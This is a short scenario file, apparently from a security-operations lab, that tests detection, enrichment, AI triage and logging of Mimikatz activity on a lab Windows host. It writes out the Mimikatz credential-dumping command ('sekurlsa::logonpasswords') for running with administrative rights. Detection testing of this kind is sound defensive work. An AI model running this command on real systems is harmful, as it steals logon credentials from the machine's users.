# Scenario 1: Credential Dumping via Mimikatz

## 🎯 Objective
Validate the automated SOC/SOAR detection, threat intelligence enrichment, AI triage, and incident logging pipeline when Mimikatz process execution occurs.

## 💻 Execution Steps
1. Open PowerShell with Administrative privileges on Windows Target (`10.1.0.2`)[cite: 1, 3].
2. Execute MimikatzLSASS dump command:
   ```powershell
   .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit
